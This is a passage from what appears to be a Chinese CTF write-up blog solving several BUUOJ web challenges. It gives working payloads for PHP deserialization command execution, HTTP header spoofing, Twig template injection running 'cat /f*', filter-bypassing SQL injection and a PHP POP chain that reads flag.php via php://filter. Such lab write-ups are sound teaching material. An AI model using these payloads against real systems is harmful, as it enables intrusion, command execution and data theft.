class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>分析发现禁用了不少函数，调用了<code>call_user_func()</code>函数，可能存在命令执行。</p><p><code>gettype()</code>函数限制执行后返回必须为String类型。</p><p>观察发现，本题只对传入参数进行一次waf，代码中还给了个类Test，类中调用<code>gettime()</code>函数不会被waf，于是可用序列化方法，将代码序列化传入，再反序列化执行命令。</p><p>尝试传参</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:2:&quot;ls&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210191635044.png" class="" title="image-20201210191635044" loading="lazy"><p>再扫根目录文件</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:4:&quot;ls &#x2F;&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210192034277.png" class="" title="image-20201210192034277" loading="lazy"><p>根目录没发现flag，利用system来找一下，<code>find / -name fla*</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210192305790.png" class="" title="image-20201210192305790" loading="lazy"><p>发现了奇怪的东西，打开即为flag</p><img src="/article/Buuoj-WEB-Write-up/image-20201210192428939.png" class="" title="image-20201210192428939" loading="lazy"><p>payload：</p><pre class="language-none"><code class="language-none">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><hr><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><h5 id="Http-Header"><a href="#Http-Header" class="headerlink" title="Http Header"></a>Http Header</h5><p>考验http请求头，打开随便登陆底部源码提示<code>&lt;!-- L0g1n.php --&gt;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201210194805424.png" class="" title="image-20201210194805424" loading="lazy"><ol><li>提示<code>Sorry, this site will be available after totally 99 years!</code></li></ol><p>修改Cookie中<code>time=9999999999</code></p><ol start="2"><li>提示<code>Sorry, this site is only optimized for those who comes from localhost</code></li></ol><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>提示<code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive·</code></p><p>添加<code>Client-IP: 127.0.0.1</code></p><ol start="3"><li>提示<code>Sorry, this site is only optimized for those who come from gem-love.com</code></li></ol><p>添加<code>Referer: gem-love.com</code></p><ol start="4"><li>提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></li></ol><p>资料：科摩多64位安全浏览器的UA为 Commodore 64 </p><p>修改<code>User-Agent: Commodore 64</code></p><ol start="5"><li>提示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></li></ol><p>添加<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p><ol start="6"><li>提示<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></li></ol><p>添加<code>Via: y1ng.vip</code></p><p>提示</p><pre class="language-none"><code class="language-none">Sorry, even you are good at http header, you&#39;re still not my admin.&lt;br&gt; Althoungh u found me, u still dont know where is flag &lt;!--&#123;一段base64编码&#125;--&gt;</code></pre><p>base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧…</p><p>最终payload：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>L0g1n<span class="token operator">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> node3<span class="token operator">.</span>buuoj<span class="token operator">.</span>cn<span class="token punctuation">:</span><span class="token number">26256</span>Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Commodore <span class="token number">64</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflateAccept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span><span class="token constant">CN</span><span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>Cookie<span class="token punctuation">:</span> UM_distinctid<span class="token operator">=</span><span class="token number">1762</span>cb225c986d<span class="token operator">-</span><span class="token number">0970</span>f0908a83e6<span class="token operator">-</span><span class="token number">3323766</span><span class="token operator">-</span><span class="token number">144000</span><span class="token operator">-</span><span class="token number">1762</span>cb225ca565<span class="token punctuation">;</span> <span class="token constant">PHPSESSID</span><span class="token operator">=</span>qo3u19su6i7oha2lte6grem4t6<span class="token punctuation">;</span> time<span class="token operator">=</span><span class="token number">9999999999</span>Connection<span class="token punctuation">:</span> close<span class="token constant">X</span><span class="token operator">-</span>Forwarded<span class="token operator">-</span><span class="token keyword">For</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Client<span class="token operator">-</span><span class="token constant">IP</span><span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>Referer<span class="token punctuation">:</span> gem<span class="token operator">-</span>love<span class="token operator">.</span>comFrom<span class="token punctuation">:</span> root@gem<span class="token operator">-</span>love<span class="token operator">.</span>comVia<span class="token punctuation">:</span> y1ng<span class="token operator">.</span>vip</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201210195920865.png" class="" title="image-20201210195920865" loading="lazy"><hr><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h5 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h5><img src="/article/Buuoj-WEB-Write-up/image-20201213144912657.png" class="" title="image-20201213144912657" loading="lazy"><p>ID测试，不是SQL注入，测试<code>&#123;&#123;1+1&#125;&#125;</code></p><p>返回<code>2</code>，确认SSTI</p><img src="/article/Buuoj-WEB-Write-up/image-20201213145018456.png" class="" title="image-20201213145018456" loading="lazy"><p>根据流程，测试<code>&#123;&#123;2*'1'&#125;&#125;</code></p><p>输出<code>49</code></p><p>确认为Twig模板引擎</p><p>直接打Payload：</p><p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /f*")&#125;&#125;</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201213145633846.png" class="" title="image-20201213145633846" loading="lazy"><hr><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>注册，登陆，尝试SSTI没有，最后在广告标题处发现SQL注入</p><p>过滤<code> </code>,<code>+</code>,<code>or</code>,<code>and</code>等</p><p>空格用<code>/**/</code>替换</p><p>尝试爆列数，好家伙，22列</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>回显点在2,3</p><p>查一下数据库名</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173543614.png" class="" title="image-20201213173543614" loading="lazy"><p>库名web1</p><p>因为ban了<code>or</code>,所以<code>information_schema</code>,这时有<code>mysql.innodb_table_stats</code>，mysql默认是关闭InnoDB存储引擎 ，仅 Mysql&gt;5.6.x 可使用</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mariadb链接</a></p><p>查表</p><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201213173634852.png" class="" title="image-20201213173634852" loading="lazy"><p>表名<code> FLAG_TABLE</code>,<code>news</code>,<code>users</code>,<code>gtid_slave_pos</code>,<code>ads</code>,<code>users </code></p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><pre class="language-none"><code class="language-none">1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(a)&#x2F;**&#x2F;from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;a&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>原型</p><pre class="language-none"><code class="language-none">1&#39;union select 1,(select group_concat(a) from(select 1,2,3 as a union select * from users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></pre><p>2处是回显点，所以对2出注入，首先联合查询</p><p>然后分析<code>(select group_concat(a) from(select 1,2,3 as a union select * from users)x)</code></p><p>确认users列在web1中，慢慢试，无列名注入表的列数不相同会报错，最后发现users里有三列 </p><p>采用的子查询的方式，子查询是将一个查询语句嵌套在另一个查询语句中，在特定的情况下，一个查询语句的条件需要另一个查询语句来获取，内层查询语句的查询结果，可以为外层查询语句提供查询条件。 </p><p><code>(select 1,2,3 as a union select * from users)</code></p><p>将users这个表里面的查询的结果提供给外部查询，同时把列名转换成a，直接<code>group_concat(a)</code>可得结果</p><img src="/article/Buuoj-WEB-Write-up/image-20201213175809048.png" class="" title="image-20201213175809048" loading="lazy"><hr><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><p>先上源码</p><pre class="language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>三个类</p><p><code>Modifier</code>，<code>Show</code>，<code>Test</code></p><p>逐个分析，首先路口题目给了从<code>Show</code>，可能不对，但还是先从<code>Show</code>看</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>三个魔术方法</p><pre class="language-php" data-language="php"><code class="language-php">__construct：当一个对象创建时调用__toString：当一个对象被当作一个字符串被调用__wakeup：反序列化时触发</code></pre><p>从<code>Show</code>入口，会调用<code>__wakeup</code>魔术方法，方法里将<code>$this-&gt;source</code>做字符串在<code>preg_match</code>函数里比较， 如果<code>$this-&gt;source</code>是Show类，这时会调用<code>__toString</code>方法。</p><p>再看<code>Modifier</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>一个魔术方法</p><pre class="language-none"><code class="language-none">__invoke：将对象调用为函数时触发</code></pre><p>很明显的文件包含<code>include</code>，这个类就是最终要读取<code>flag.php</code>的时候使用的了，我们要让<code>Modifier</code>被当做函数调用，这时就会调用<code>__invoke</code>方法，从而调用<code>append</code>函数，进行文件包含。</p><p>最后看<code>Test</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>两个魔术方法</p><pre class="language-none"><code class="language-none">__construct：当一个对象创建时调用__get：用于从不可访问的属性读取数据</code></pre><p>很关键的<code>__get</code>魔术方法，这里会返回<code>$this-&gt;p</code>即<code>$function()</code>作为函数调用，而我们恰好需要让<code>Modifier</code>被当做函数调用，只要在<code>Show</code>里实例化<code>Test</code>类，这样一来一条pop链就形成了。</p><h6 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h6><p>从<code>Show</code>入手，先反序列化函数触发<code>Show</code>类中<code>__wakeup</code>方法，方法内调用函数触发<code>__tosring</code>方法，<code>__tosring</code>中将<code>str</code>实例化为<code>Test</code>类，而<code>Test</code>类中没有<code>source</code>属性，所以会调用<code>__get</code>方法， 将<code>function</code>实例化为<code>Modifier</code>类，触发<code>Modifier</code>中的<code>__invoke</code>方法，最终调用<code>include</code>函数文件包含<code>flag.php</code></p><p>payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//Show()->__wakeup()->__tostring()->str->Test->__get()->Modefier->__invoke()->"flag.php"</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">;</span><span class="token comment">//O:4:"Show":2:&#123;s:6:"source";O:4:"Show":2:&#123;s:6:"source";s:3:"123";s:3:"str";O:4:"Test":1:&#123;s:1:"p";O:8:"Modifier":1:&#123;s:6:" * var";s:52:"php://filter/convert.base64-encode/resource=flag.php";&#125;&#125;&#125;s:3:"str";N;&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 